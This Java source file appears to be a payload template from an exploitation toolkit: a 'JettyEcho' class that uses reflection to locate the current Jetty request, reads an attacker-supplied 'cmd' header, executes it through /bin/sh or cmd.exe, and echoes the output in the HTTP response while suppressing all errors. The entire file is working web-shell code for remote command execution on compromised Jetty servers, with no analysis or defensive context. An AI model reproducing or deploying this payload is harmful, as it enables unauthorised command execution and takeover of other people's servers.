package dev.silente.javashark.template.echo;

import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Scanner;

public class JettyEcho {
    private String getReqHeaderName() {
        return "cmd";
    }

    public JettyEcho() {
        try {
            Thread thread = Thread.currentThread();
            Field field = Class.forName("java.lang.Thread").getDeclaredField("threadLocals");
            field.setAccessible(true);
            Object threadLocals = field.get(thread);
            Class<?> threadLocalMap = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");
            Field tableField = threadLocalMap.getDeclaredField("table");
            tableField.setAccessible(true);
            Object table = tableField.get(threadLocals);
            Class<?> entry = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");
            Field valueField = entry.getDeclaredField("value");
            valueField.setAccessible(true);
            Object httpConnection = null;

            for(int i = 0; i < Array.getLength(table); ++i) {
                Object obj = Array.get(table, i);
                if (obj != null) {
                    httpConnection = valueField.get(obj);
                    if (httpConnection != null && httpConnection.getClass().getName().endsWith("HttpConnection")) {
                        break;
                    }
                }
            }
            Object httpChannel = httpConnection.getClass().getMethod("getHttpChannel").invoke(httpConnection);
            Object response = httpChannel.getClass().getMethod("getResponse").invoke(httpChannel);
            Object request = httpChannel.getClass().getMethod("getRequest").invoke(httpChannel);
            String cmd = (String)request.getClass().getMethod("getHeader", String.class).invoke(request, this.getReqHeaderName());
            if (cmd != null) {
                PrintWriter writer = (PrintWriter)response.getClass().getMethod("getWriter").invoke(response);
                writer.write(this.exec(cmd));
                writer.flush();
                writer.close();
            }
        } catch (Exception var16) {
        }
    }

    private String exec(String cmd) {
        try {
            boolean isLinux = true;
            String osType = System.getProperty("os.name");
            if (osType != null && osType.toLowerCase().contains("win")) {
                isLinux = false;
            }

            ArrayList<String> cmds = new ArrayList<>();
            if (isLinux) {
                cmds.add("/bin/sh");
                cmds.add("-c");
                cmds.add(cmd);
            } else {
                cmds.add("cmd.exe");
                cmds.add("/c");
                cmds.add(cmd);
            }
            String[] cmdsArray = new String[cmds.size()];
            cmds.toArray(cmdsArray);
            InputStream ins = Runtime.getRuntime().exec(cmdsArray).getInputStream();
            Scanner s = (new Scanner(ins)).useDelimiter("\\a");

            String execRes;
            for(execRes = ""; s.hasNext(); execRes = execRes + s.next()) {}

            return execRes;
        } catch (Exception var8) {
            Exception e = var8;
            return e.getMessage();
        }
    }
}
